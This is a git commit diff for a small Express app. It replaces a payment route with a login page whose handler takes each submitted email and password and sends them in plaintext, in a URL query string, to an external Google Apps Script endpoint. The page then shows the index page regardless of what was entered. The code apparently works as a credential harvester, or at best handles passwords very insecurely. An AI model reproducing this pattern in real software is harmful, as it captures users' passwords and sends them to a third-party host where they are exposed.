846b9e7f5c7f2fc1f769a66d297505c666be451f
madhhuurrii <madhuriramakrishnan061@gmail.com>
2021-09-25 15:10:02 +0530

    add

--- app.js
+++ app.js
@@ -1,19 +1,40 @@
-const { urlencoded } = require('express');
-const express = require('express');
+const express = require("express");
+const expressLayouts = require("express-ejs-layouts");
 const app = express();
+const fetch = require("node-fetch");
+const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyuUA6lB1SKnQWOrrb1QiE8aK8DG_4IkC3nnYoxn-9SDL2PlXPKQrC7AzSeKiV6_gzv/exec"
 
-app.use(express.static('public'))
-app.use(express.urlencoded({ extended:true }))
+// EJS
+app.use(expressLayouts);
+app.set("view engine", "ejs");
 
-//View Engine
-app.set('view engine', 'ejs')
+// Express body parser
+app.use(express.urlencoded({ extended: true }));
 
-// Import Route
-const payRoute = require('./routes/pay');
+app.get("/", (req, res) => {
+  res.render("login");
+});
 
-//Middleware Route
-app.use('/',payRoute);
+app.post("/index", (req, res) => {
+  
+  const email = req.body.email;
+  const password = req.body.password;
+  
 
-const PORT = process.env.PORT || 5000;
-app.listen(PORT,() => console.log(`This app is listening on port ${PORT}`));
+  const url = `${GOOGLE_SHEET_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(
+    password
+  )}`;
 
+  fetch(url)
+    .then((res) => {
+      return res.json();
+    })
+    .then((res) => console.log("google sheet res", { res }))
+    .catch((error) => console.error(error));
+
+  res.render("index");
+});
+
+app.listen(5000, () => {
+  console.log("Server is running on PORT 5000");
+});
